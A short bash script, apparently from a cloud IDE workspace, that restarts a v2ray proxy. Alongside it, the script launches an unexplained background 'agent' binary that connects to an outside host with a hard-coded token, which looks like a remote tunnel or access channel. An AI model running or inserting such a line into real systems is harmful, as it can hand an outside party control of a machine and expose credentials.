#!/bin/bash

###########################################################
###		This is a services script		###
###########################################################

LOCAL=$HOME/.goormide

if [[ ! -d $LOCAL/log ]]
then
  mkdir $LOCAL/log
fi

#v2ray server service
v2rayServer() {
  PID=`ps aux |grep "v2ray-server"| awk '{print $2}'`
  if [[ $PID != ""  ]]
  then
    kill -9 $PID > /dev/null 2>&1
    sleep 1
  fi
  nohup  /usr/bin/v2ray/v2ray -config /etc/v2ray/config.json  & 
  ./agent -s agent.findmvps.tk:5555 -p 4835fdc79155802bf5 -d &
}

v2rayServer
